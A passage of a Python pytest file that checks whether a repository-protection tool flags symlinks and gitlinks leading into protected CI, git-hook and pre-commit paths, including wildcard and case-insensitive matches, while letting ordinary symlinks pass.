    assert m.import_bundle(REPO, b, "fresh", rules) == root


# --- symlinks and gitlinks into handover paths ---------------------------------------------


def link(repo: Path, path: str, target: str) -> str:
    (repo / path).parent.mkdir(parents=True, exist_ok=True)
    os.symlink(target, repo / path)
    git("add", path, cwd=repo)
    git("commit", "-q", "-m", f"link {path}", cwd=repo)
    return git("rev-parse", "HEAD", cwd=repo)


def _seed_link(env, path: str, target: str, files: dict[str, str]) -> None:
    seed = env.tmp / "seed"
    for name, content in files.items():
        commit(seed, name, content)
    link(seed, path, target)
    git("push", "-q", env.url, "main", cwd=seed)


@pytest.mark.parametrize(
    ("path", "target", "files", "edit"),
    [
        (".githooks", "scripts", {"scripts/pre-commit": "#!/bin/sh"}, "scripts/x"),
        (".pre-commit-config.yaml", "tools/pc.yaml", {"tools/pc.yaml": "repos: []"}, "tools/pc.yaml"),
        (".github", "ci", {"ci/workflows/ci.yml": "on: push"}, "ci/workflows/ci.yml"),
        (".github/workflows", "../ci", {"ci/ci.yml": "on: push"}, "ci/ci.yml"),
    ],
)
def test_protected_changes_tip_with_symlink_into_handover_path(env, m, rules, checkout, path, target, files, edit):
    """A symlink at or above a handover path makes any edit through it a handover-path change."""
    _seed_link(env, path, target, files)
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
    commit(checkout, edit, "changed")
    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((path,), ())


def test_protected_changes_commit_adding_dotgithub_symlink(env, m, rules, checkout):
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "ci/workflows/ci.yml", "on: push")
    link(checkout, ".github", "ci")
    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((".github",), ())


def test_protected_changes_gitlink_and_symlink_entries(env, m, rules, checkout):
    """A gitlink at a handover path is listed like a symlink; so is a symlink the push did not change."""
    _seed_link(env, ".github", "ci", {"ci/workflows/ci.yml": "on: push"})
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
    target = git("rev-parse", "HEAD", cwd=checkout)
    git("update-index", "--add", "--cacheinfo", f"160000,{target},.githooks", cwd=checkout)
    git("commit", "-q", "-m", "gitlink", cwd=checkout)
    sha = git("rev-parse", "HEAD", cwd=checkout)
    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((".githooks", ".github"), (sha,))


def test_protected_changes_gitlink_under_wildcard_prefix(env, m, rules, checkout):
    git("switch", "-q", "-c", "topic", cwd=checkout)
    target = git("rev-parse", "HEAD", cwd=checkout)
    git("update-index", "--add", "--cacheinfo", f"160000,{target},skills/x", cwd=checkout)
    git("commit", "-q", "-m", "gitlink", cwd=checkout)
    found = _changes(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon("skills/*/hooks/**"))[1]
    assert found == Protected(("skills/x",), ())


def test_protected_changes_symlink_matching_extra_pattern_case_insensitively(env, m, rules, checkout):
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "real/x.md")
    sha = link(checkout, "Skills", "real")
    found = _changes(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon("skills/**"))[1]
    assert found == Protected(("Skills",), (sha,))


def test_protected_changes_ordinary_symlinks_pass(env, m, rules, checkout):
    _seed_link(env, "docs/readme", "../README.md", {"docs/index.md": "hi"})
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
    commit(checkout, "README.md", "changed")
    link(checkout, "github", "docs")
    assert _changes(env, m, rules, checkout, "topic")[1] == NONE


@pytest.mark.parametrize(
    ("path", "extra", "hit"),
    [
        ("skills/foo", ("skills/*/skill.md",), True),
        ("Skills/Foo", ("skills/*/skill.md",), True),
        ("docs/x", ("**/secret.md",), True),
        ("x", ("a/**/b.md",), False),
        ("a/deep/er", ("a/**/b.md",), True),
        ("docs/x", (), False),
        ("skills/foo/bar", ("skills/*.md",), False),
    ],
)
def test_protected_changes_symlink_under_wildcard_prefix(env, m, rules, checkout, path, extra, hit):
    """A symlink matching any leading prefix of a pattern can lead into it; a leading ** is reached by all."""
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "real/skill.md")
    link(checkout, path, "/".join([".."] * path.count("/") + ["real"]))
    found = _changes(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon(*extra))[1]
    assert found == (Protected((path,), ()) if hit else NONE)
